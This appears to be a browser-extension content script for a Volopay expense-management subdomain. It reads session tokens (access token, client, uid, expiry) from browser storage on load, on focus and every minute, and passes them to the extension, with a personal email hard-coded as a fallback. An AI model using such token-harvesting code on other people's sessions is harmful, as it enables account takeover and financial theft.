// Injected on https://iskconwhitefield.volopay.co.in/*
(function () {
  function extractAndPushTokens() {
    try {
      function get(k) {
        return localStorage.getItem(k) || sessionStorage.getItem(k) || "";
      }
      const at = get("access-token") || get("accessToken") || "";
      const cl = get("client") || "";
      const uid = get("uid") || "abhishek.nitj.002@gmail.com";
      const exp = get("expiry") || "";

      if (at && cl && at !== "null" && cl !== "null") {
        chrome.runtime.sendMessage({
          type: "VOLOPAY_TOKENS_EXTRACTED",
          tokens: {
            access_token: at,
            client: cl,
            uid: uid,
            expiry: exp,
            account: "iskconwhitefield"
          }
        }, () => {});
      }
    } catch (e) {
      // Ignore errors in sandboxed contexts
    }
  }

  // Run on initial load and whenever user interacts
  extractAndPushTokens();
  window.addEventListener("focus", extractAndPushTokens);
  setInterval(extractAndPushTokens, 60000); // refresh every minute if tab stays open
})();
